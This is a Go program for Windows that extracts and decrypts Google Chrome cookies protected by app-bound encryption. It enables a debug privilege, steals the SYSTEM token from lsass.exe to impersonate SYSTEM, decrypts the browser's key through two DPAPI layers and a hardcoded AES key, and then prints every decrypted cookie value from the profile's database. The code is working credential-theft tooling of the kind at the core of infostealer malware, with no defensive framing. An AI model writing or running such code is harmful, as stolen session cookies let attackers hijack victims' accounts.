package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"golang.org/x/sys/windows"
	_ "modernc.org/sqlite"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

var (
	crypt32                     = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData      = crypt32.NewProc("CryptUnprotectData")
	advapi32                    = syscall.NewLazyDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = advapi32.NewProc("RevertToSelf")
	ntdll                       = syscall.NewLazyDLL("ntdll.dll")
	procRtlAdjustPrivilege      = ntdll.NewProc("RtlAdjustPrivilege")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

type LocalState struct {
	OSCrypt struct {
		AppBoundEncryptedKey string `json:"app_bound_encrypted_key"`
	} `json:"os_crypt"`
}

type Cookie struct {
	Host  string
	Name  string
	Value string
	Path string
	Expire string
}

func enablePrivilege() error {
	var privilege uint32 = 20
	var previousValue uint32 = 0

	ret, _, _ := procRtlAdjustPrivilege.Call(
		uintptr(privilege),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&previousValue)),
	)

	if ret != 0 {
		return fmt.Errorf("RtlAdjustPrivilege failed with status: %x", ret)
	}

	return nil
}

func findLsassProcess() (*windows.Handle, error) {
	h, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(h)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	if err = windows.Process32First(h, &pe); err != nil {
		return nil, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		name := windows.UTF16ToString(pe.ExeFile[:])
		if name == "lsass.exe" {
			handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pe.ProcessID)
			if err != nil {
				return nil, fmt.Errorf("OpenProcess failed: %v", err)
			}
			return &handle, nil
		}

		err = windows.Process32Next(h, &pe)
		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				break
			}
			return nil, fmt.Errorf("Process32Next failed: %v", err)
		}
	}

	return nil, fmt.Errorf("lsass.exe not found")
}

func getSystemToken() (windows.Token, error) {
	if err := enablePrivilege(); err != nil {
		return 0, fmt.Errorf("failed to enable privileges: %v", err)
	}

	processHandle, err := findLsassProcess()
	if err != nil {
		return 0, fmt.Errorf("failed to find LSASS process: %v", err)
	}
	defer windows.CloseHandle(*processHandle)

	var token windows.Token
	err = windows.OpenProcessToken(*processHandle, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &token)
	if err != nil {
		return 0, fmt.Errorf("OpenProcessToken failed: %v", err)
	}

	var duplicatedToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicatedToken)
	if err != nil {
		token.Close()
		return 0, fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}
	token.Close()

	return duplicatedToken, nil
}

func impersonateSystem() (windows.Token, error) {
	token, err := getSystemToken()
	if err != nil {
		return 0, err
	}

	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(token))
	if ret == 0 {
		token.Close()
		return 0, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}

	return token, nil
}

func dpapi_decrypt(data []byte, asSystem bool) ([]byte, error) {
	if asSystem {
		token, err := impersonateSystem()
		if err != nil {
			return nil, fmt.Errorf("failed to impersonate SYSTEM: %v", err)
		}
		defer token.Close()
		defer procRevertToSelf.Call()
	}

	var dataIn, dataOut dataBlob
	var entropy dataBlob

	dataIn.cbData = uint32(len(data))
	dataIn.pbData = &data[0]

	flags := uint32(1) // CRYPTPROTECT_UI_FORBIDDEN

	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0,
		uintptr(unsafe.Pointer(&entropy)),
		0,
		0,
		uintptr(flags),
		uintptr(unsafe.Pointer(&dataOut)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(dataOut.pbData)))

	decrypted := make([]byte, dataOut.cbData)
	copy(decrypted, unsafe.Slice(dataOut.pbData, dataOut.cbData))

	return decrypted, nil
}

func decryptChromeKey() ([]byte, error) {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		return nil, fmt.Errorf("USERPROFILE environment variable not set")
	}

	localStatePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var localState LocalState
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("failed to parse Local State: %v", err)
	}

	app_bound_encrypted_key := localState.OSCrypt.AppBoundEncryptedKey
	if app_bound_encrypted_key == "" {
		return nil, fmt.Errorf("no encrypted key found in Local State")
	}

	// decode from b64
	decoded, err := base64.StdEncoding.DecodeString(app_bound_encrypted_key)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encrypted key: %v", err)
	}

	if string(decoded[:4]) != "APPB" {
		return nil, fmt.Errorf("invalid key prefix")
	}

	// decrypt with system elevation DPAPI
	decrypted1, err := dpapi_decrypt(decoded[4:], true)
	if err != nil {
		return nil, fmt.Errorf("first DPAPI decrypt failed: %v", err)
	}

	// decrypt with user level DPAPI
	decrypted2, err := dpapi_decrypt(decrypted1, false)
	if err != nil {
		return nil, fmt.Errorf("second DPAPI decrypt failed: %v", err)
	}

	// get last 61 bytes
	if len(decrypted2) < 61 {
		return nil, fmt.Errorf("decrypted key too short, got %d bytes", len(decrypted2))
	}
	decrypted_key := decrypted2[len(decrypted2)-61:]

	if decrypted_key[0] != 1 {
		return nil, fmt.Errorf("invalid key format")
	}

	// decrypt key with AES256GCM
	aes_key, err := base64.StdEncoding.DecodeString("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
	if err != nil {
		return nil, fmt.Errorf("failed to decode AES key: %v", err)
	}

	// key parts
	iv := decrypted_key[1 : 1+12]
	ciphertext := decrypted_key[1+12 : 1+12+32]
	tag := decrypted_key[1+12+32:]

	// create AES-GCM cipher
	block, err := aes.NewCipher(aes_key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	// decrypt final key
	key, err := aesGCM.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt key: %v", err)
	}

	return key, nil
}

func decryptCookieValue(encryptedValue []byte, key []byte) (string, error) {
	if len(encryptedValue) < 31 { // 3 (flag) + 12 (IV) + min_data + 16 (tag)
		return "", fmt.Errorf("encrypted value too short")
	}

	// extract IV, ciphertext, and tag, skipping the first 3 bytes
	cookieIV := encryptedValue[3:15]
	encryptedCookie := encryptedValue[15 : len(encryptedValue)-16]
	cookieTag := encryptedValue[len(encryptedValue)-16:]

	// combine encrypted data and tag for GCM decryption
	encryptedDataWithTag := append(encryptedCookie, cookieTag...)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, cookieIV, encryptedDataWithTag, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %v", err)
	}

	// chrome cookies have a 32-byte prefix in the plaintext that can be skipped
	if len(plaintext) <= 32 {
		return "", fmt.Errorf("decrypted value too short")
	}
	return string(plaintext[32:]), nil
}

func getCookies(key []byte) ([]Cookie, error) {
	userProfile := os.Getenv("USERPROFILE")
	dbPath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

	tempDir := os.TempDir()
	tempDB := filepath.Join(tempDir, "cookies.db")
	data, err := os.ReadFile(dbPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read cookie database: %v", err)
	}
	if err := os.WriteFile(tempDB, data, 0600); err != nil {
		return nil, fmt.Errorf("failed to write temporary database: %v", err)
	}
	defer os.Remove(tempDB)

	db, err := sql.Open("sqlite", tempDB)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %v", err)
	}
	defer db.Close()

	// query cookie db
	rows, err := db.Query(`SELECT host_key, name, CAST(encrypted_value AS BLOB), path, expires_utc from cookies`)
	if err != nil {
		return nil, fmt.Errorf("failed to query database: %v", err)
	}
	defer rows.Close()

	var cookies []Cookie
	for rows.Next() {
		var cookie Cookie
		var encryptedValue []byte

		err := rows.Scan(
			&cookie.Host,
			&cookie.Name,
			&encryptedValue,
			&cookie.Path, 
			&cookie.Expire
		)
		if err != nil {
			return nil, fmt.Errorf("failed to scan row: %v", err)
		}

		fmt.Printf("\nCookie: %s\n", cookie.Name)
		fmt.Printf("Raw encrypted value (%d bytes): %x\n", len(encryptedValue), encryptedValue)

		// decrypt cookie value
		decrypted, err := decryptCookieValue(encryptedValue, key)
		if err != nil {
			fmt.Printf("Warning: failed to decrypt cookie %s: %v\n", cookie.Name, err)
			continue
		}
		cookie.Value = decrypted
		cookies = append(cookies, cookie)
	}

	return cookies, nil
}

func main() {
	key, err := decryptChromeKey()
	if err != nil {
		fmt.Printf("Failed to decrypt Chrome key: %v\n", err)
		return
	}

	fmt.Printf("chrome key: %s\n", base64.StdEncoding.EncodeToString(key))

	cookies, err := getCookies(key)
	if err != nil {
		fmt.Printf("Failed to get cookies: %v\n", err)
		return
	}

	fmt.Printf("\nFound %d cookies:\n", len(cookies))
	for _, cookie := range cookies {
		fmt.Printf("\nHost: %s\n", cookie.Host)
		fmt.Printf("Name: %s\n", cookie.Name)
		fmt.Printf("Value: %s\n", cookie.Value)
		fmt.Printf("Path: %s\n", cookie.Path)
		fmt.Printf("Expire: %s\n", cookie.Expire)
		fmt.Printf("-------------------\n")
	}
}
